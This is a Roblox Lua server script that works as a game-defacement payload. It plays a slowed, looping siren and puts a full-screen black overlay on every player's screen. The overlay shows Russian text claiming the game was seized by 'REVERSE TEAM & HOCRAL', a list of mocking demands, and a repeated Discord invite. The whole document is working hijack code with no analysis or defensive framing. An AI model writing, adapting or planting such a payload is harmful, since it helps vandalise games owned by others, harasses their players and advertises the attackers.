local Players = game:GetService("Players")

-- Звук сирены на сервере
local s2 = Instance.new("Sound")
s2.Name = "ScarySound"
s2.Parent = workspace
s2.SoundId = "rbxassetid://122776813003598"
s2.Looped = true
s2.Volume = 1
s2.PlaybackSpeed = 0.1
s2.Playing = true

local function createGUI(p)
	local Converted = {
	["_StaticCopyGui"] = Instance.new("ScreenGui");
	["_MainFrame"] = Instance.new("Frame");
	["_TextLabel"] = Instance.new("TextLabel");
	["_TextLabel1"] = Instance.new("TextLabel");
	["_TextLabel2"] = Instance.new("TextLabel");
	["_TextLabel3"] = Instance.new("TextLabel");
	["_TextLabel4"] = Instance.new("TextLabel");
	["_ImageLabel"] = Instance.new("ImageLabel");
	["_TextLabel5"] = Instance.new("TextLabel");
	["_ImageLabel1"] = Instance.new("ImageLabel");
}

-- Properties:

Converted["_StaticCopyGui"].DisplayOrder = 9999
Converted["_StaticCopyGui"].IgnoreGuiInset = true
Converted["_StaticCopyGui"].ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
Converted["_StaticCopyGui"].ResetOnSpawn = false
Converted["_StaticCopyGui"].Name = "StaticCopyGui"
Converted["_StaticCopyGui"].Parent = game.Players:FindFirstChild(p.Name).PlayerGui

Converted["_MainFrame"].BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Converted["_MainFrame"].Size = UDim2.new(1, 0, 1, 0)
Converted["_MainFrame"].Name = "MainFrame"
Converted["_MainFrame"].Parent = Converted["_StaticCopyGui"]

Converted["_TextLabel"].Font = Enum.Font.SourceSansBold
Converted["_TextLabel"].Text = "ДЕДУЛЯ НЕ ПОМОЖЕТ!!! САФОНОВ НЕ ПОМОЖЕТ!!!!! СКИТОВ НЕ ПОМОЖЕТ!!!!"
Converted["_TextLabel"].TextColor3 = Color3.fromRGB(255, 0, 0)
Converted["_TextLabel"].TextScaled = true
Converted["_TextLabel"].TextWrapped = true
Converted["_TextLabel"].TextXAlignment = Enum.TextXAlignment.Left
Converted["_TextLabel"].BackgroundTransparency = 1
Converted["_TextLabel"].Position = UDim2.new(0.0399999991, 0, 0.0399999991, 0)
Converted["_TextLabel"].Size = UDim2.new(0.899999917, 0, 0.0700000003, 0)
Converted["_TextLabel"].Parent = Converted["_MainFrame"]

Converted["_TextLabel1"].Font = Enum.Font.SourceSansBold
Converted["_TextLabel1"].Text = "ВАШУ ИГРУ ЗАХВАТИЛИ REVERSE TEAM & HOCRAL"
Converted["_TextLabel1"].TextColor3 = Color3.fromRGB(255, 0, 0)
Converted["_TextLabel1"].TextScaled = true
Converted["_TextLabel1"].TextWrapped = true
Converted["_TextLabel1"].TextXAlignment = Enum.TextXAlignment.Left
Converted["_TextLabel1"].BackgroundTransparency = 1
Converted["_TextLabel1"].Position = UDim2.new(0.0399999991, 0, 0.129999995, 0)
Converted["_TextLabel1"].Size = UDim2.new(0.949999988, 0, 0.0599999987, 0)
Converted["_TextLabel1"].Parent = Converted["_MainFrame"]

Converted["_TextLabel2"].Font = Enum.Font.SourceSans
Converted["_TextLabel2"].Text = "https://discord.gg/C3Y5yAxMXz"
Converted["_TextLabel2"].TextColor3 = Color3.fromRGB(255, 0, 0)
Converted["_TextLabel2"].TextScaled = true
Converted["_TextLabel2"].TextWrapped = true
Converted["_TextLabel2"].TextXAlignment = Enum.TextXAlignment.Left
Converted["_TextLabel2"].BackgroundTransparency = 1
Converted["_TextLabel2"].Position = UDim2.new(0.0399999991, 0, 0.200000003, 0)
Converted["_TextLabel2"].Size = UDim2.new(0.899999917, 0, 0.0500000007, 0)
Converted["_TextLabel2"].Parent = Converted["_MainFrame"]

Converted["_TextLabel3"].Font = Enum.Font.SourceSansBold
Converted["_TextLabel3"].Text = "НАШИ ТРЕБОВАНИЯ:"
Converted["_TextLabel3"].TextColor3 = Color3.fromRGB(255, 0, 0)
Converted["_TextLabel3"].TextScaled = true
Converted["_TextLabel3"].TextWrapped = true
Converted["_TextLabel3"].TextXAlignment = Enum.TextXAlignment.Left
Converted["_TextLabel3"].BackgroundTransparency = 1
Converted["_TextLabel3"].Position = UDim2.new(0.0399999991, 0, 0.280000001, 0)
Converted["_TextLabel3"].Size = UDim2.new(0.899999917, 0, 0.0599999987, 0)
Converted["_TextLabel3"].Parent = Converted["_MainFrame"]

Converted["_TextLabel4"].Font = Enum.Font.SourceSans
Converted["_TextLabel4"].Text = "1. Отстранить деда от должности\n2. Снятие всех булочек деда\n3. ЧСП всех булочек деда\n4. Поставить скитов.срр на овнерку\n5. Зайти в данный дискрод сервер https://discord.gg/C3Y5yAxMXz\n6. Задавить самурая большой толстой жопой\n7. Сафонов не починит игру"
Converted["_TextLabel4"].TextColor3 = Color3.fromRGB(255, 0, 0)
Converted["_TextLabel4"].TextScaled = true
Converted["_TextLabel4"].TextWrapped = true
Converted["_TextLabel4"].TextXAlignment = Enum.TextXAlignment.Left
Converted["_TextLabel4"].TextYAlignment = Enum.TextYAlignment.Top
Converted["_TextLabel4"].BackgroundTransparency = 1
Converted["_TextLabel4"].Position = UDim2.new(0.0399999991, 0, 0.349999994, 0)
Converted["_TextLabel4"].Size = UDim2.new(0.899999917, 0, 0.25, 0)
Converted["_TextLabel4"].Parent = Converted["_MainFrame"]

Converted["_ImageLabel"].Image = "rbxassetid://85701281755059"
Converted["_ImageLabel"].ImageContent = Content{SourceType=Uri, Uri=rbxassetid://85701281755059}
Converted["_ImageLabel"].ScaleType = Enum.ScaleType.Fit
Converted["_ImageLabel"].BackgroundTransparency = 1
Converted["_ImageLabel"].Position = UDim2.new(0.664300084, 0, 0.0324390233, 0)
Converted["_ImageLabel"].Size = UDim2.new(0.311870098, 0, 0.774634123, 0)
Converted["_ImageLabel"].ZIndex = 2
Converted["_ImageLabel"].Parent = Converted["_MainFrame"]

Converted["_TextLabel5"].Font = Enum.Font.SourceSansBold
Converted["_TextLabel5"].Text = "ДЕДУЛЯ НЕ ПОМОЖЕТ!!!"
Converted["_TextLabel5"].TextColor3 = Color3.fromRGB(255, 0, 0)
Converted["_TextLabel5"].TextScaled = true
Converted["_TextLabel5"].TextWrapped = true
Converted["_TextLabel5"].TextXAlignment = Enum.TextXAlignment.Right
Converted["_TextLabel5"].BackgroundTransparency = 1
Converted["_TextLabel5"].Position = UDim2.new(0.539518476, 0, 0.93804878, 0)
Converted["_TextLabel5"].Size = UDim2.new(0.449999958, 0, 0.0599999987, 0)
Converted["_TextLabel5"].Parent = Converted["_MainFrame"]

Converted["_ImageLabel1"].Image = "rbxassetid://127198100649299"
Converted["_ImageLabel1"].ImageContent = Content{SourceType=Uri, Uri=rbxassetid://127198100649299}
Converted["_ImageLabel1"].ScaleType = Enum.ScaleType.Fit
Converted["_ImageLabel1"].BackgroundTransparency = 1
Converted["_ImageLabel1"].Position = UDim2.new(0.032721132, 0, 0.559268296, 0)
Converted["_ImageLabel1"].Size = UDim2.new(0.525755882, 0, 0.339512199, 0)
Converted["_ImageLabel1"].ZIndex = 2
Converted["_ImageLabel1"].Parent = Converted["_MainFrame"]
end

for _, p in ipairs(Players:GetPlayers()) do
	task.spawn(function()
		createGUI(p)
	end)
end

Players.PlayerAdded:Connect(createGUI)
